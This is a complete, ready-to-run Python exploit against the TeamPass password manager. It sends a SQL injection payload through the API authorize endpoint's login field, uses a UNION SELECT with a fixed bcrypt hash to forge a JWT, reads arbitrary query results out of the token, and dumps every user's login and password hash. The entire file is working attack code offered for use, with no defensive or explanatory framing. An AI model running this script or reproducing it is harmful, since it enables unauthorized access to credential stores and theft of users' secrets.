#!/usr/bin/env python3
import sys
import json
import base64
import logging
import requests
from typing import Optional, Dict, Any
from dataclasses import dataclass

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@dataclass
class TeamPassExploit:
    base_url: str
    arbitrary_hash: str = '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'
    
    def __post_init__(self):
        self.vulnerable_url = f"{self.base_url}/api/index.php/authorize"
        
    def check_api_enabled(self) -> bool:
        """Check if the API feature is enabled."""
        try:
            response = requests.get(self.vulnerable_url)
            if "API usage is not allowed" in response.text:
                logger.error("API feature is not enabled")
                return False
            return True
        except requests.RequestException as e:
            logger.error(f"Error checking API: {e}")
            return False

    def execute_sql(self, sql_query: str) -> Optional[str]:
        """Execute an SQL query via the vulnerability."""
        try:
            inject = f"none' UNION SELECT id, '{self.arbitrary_hash}', ({sql_query}), private_key, " \
                     "personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' " \
                     "FROM teampass_users WHERE login='admin"
            
            data = {
                "login": inject,
                "password": "h4ck3d",
                "apikey": "foo"
            }
            
            response = requests.post(
                self.vulnerable_url,
                headers={"Content-Type": "application/json"},
                json=data
            )
            
            if not response.ok:
                logger.error(f"Request error: {response.status_code}")
                return None
                
            token = response.json().get('token')
            if not token:
                logger.error("Token not found in response")
                return None
                
            # Decode JWT token
            token_parts = token.split('.')
            if len(token_parts) < 2:
                logger.error("Invalid JWT token")
                return None
                
            payload = base64.b64decode(token_parts[1] + '=' * (-len(token_parts[1]) % 4))
            return json.loads(payload).get('public_key')
            
        except Exception as e:
            logger.error(f"Error executing SQL: {e}")
            return None

    def get_user_credentials(self) -> Optional[Dict[str, str]]:
        """Retrieve credentials for all users."""
        try:
            # Get total number of users
            user_count = self.execute_sql("SELECT COUNT(*) FROM teampass_users WHERE pw != ''")
            if not user_count or not user_count.isdigit():
                logger.error("Could not retrieve the number of users")
                return None
                
            user_count = int(user_count)
            logger.info(f"Found {user_count} users in the system")
            
            credentials = {}
            for i in range(user_count):
                username = self.execute_sql(
                    f"SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT {i},1"
                )
                password = self.execute_sql(
                    f"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT {i},1"
                )
                
                if username and password:
                    credentials[username] = password
                    logger.info(f"Retrieved credentials for: {username}")
                
            return credentials
            
        except Exception as e:
            logger.error(f"Error retrieving credentials: {e}")
            return None

def main():
    if len(sys.argv) < 2:
        logger.error("Usage: python3 script.py <base-url>")
        sys.exit(1)
        
    exploit = TeamPassExploit(sys.argv[1])
    
    if not exploit.check_api_enabled():
        sys.exit(1)
        
    credentials = exploit.get_user_credentials()
    if credentials:
        print("\nRetrieved credentials:")
        for username, password in credentials.items():
            print(f"{username}: {password}")

if __name__ == "__main__":
    main()
